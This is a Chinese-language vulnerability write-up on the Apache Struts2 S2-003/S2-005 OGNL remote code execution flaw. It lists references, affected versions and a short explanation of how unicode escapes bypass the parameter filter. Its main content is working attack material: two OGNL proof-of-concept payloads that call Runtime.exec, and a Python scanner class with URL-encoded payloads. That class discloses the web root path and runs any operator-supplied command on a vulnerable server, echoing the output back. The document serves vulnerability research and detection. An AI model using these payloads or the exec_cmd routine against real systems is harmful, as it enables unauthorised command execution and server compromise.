## 参考

>https://mochazz.github.io/2020/06/28/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-003/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D
>
>https://blog.csdn.net/u011721501/article/details/41626959
>
>https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md

## 漏洞概要

Struts2-003是一个远程代码执行漏洞，Struts2-005为Struts2-003补丁绕过。

影响版本： **Struts 2.0.0 - Struts 2.1.8.1** 。

更多详情可参考官方通告：https://cwiki.apache.org/confluence/display/WW/S2-003 

## POC

```
# struts-005 poc
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'deepin-calculator\')')(bla)(bla)
```

```
# struts-005 poc
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)
&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)
&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)
&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
```

## 总结

到这里整个漏洞机理就比较清楚了。由于参数进入了params拦截器中，这个拦截器将url参数中的Ognl表达式以键值对的方式放入值栈，然后Ognl解析执行引擎就会按照规定的语法规则解析字符串并执行Ognl表达式。由于拦截器中没有对特定的符号进行完全的过滤（没有过滤八进制和十六进制的unicode码），所以导致任意代码执行。

## 扫描器

这里使用的是s2-005因为s2-005里面包含了s2-003

```python
class S2_005:
    """S2-005漏洞检测利用类"""
    info = "[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行"
    web_path = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29"
    exec_payload1 = "%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27{cmd}%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"
    exec_payload2 = "%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&%28g%29%28%28%27%5C43mycmd%5C75%5C%27{cmd}%5C%27%27%29%28d%29%29&%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """选择可以利用成功的payload"""
        self.exec_payload = self.exec_payload1
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-005'
        else:
            self.exec_payload = self.exec_payload2
            html = echo_check(self)
            if str(html).startswith("ERROR:"):
                return html
            if html:
                self.is_vul = True
                return 'S2-005'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + '?' + self.web_path, self.headers, self.encoding)
        return html

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get_stream(self.url + '?' + payload, self.headers, self.encoding)
        return html
```

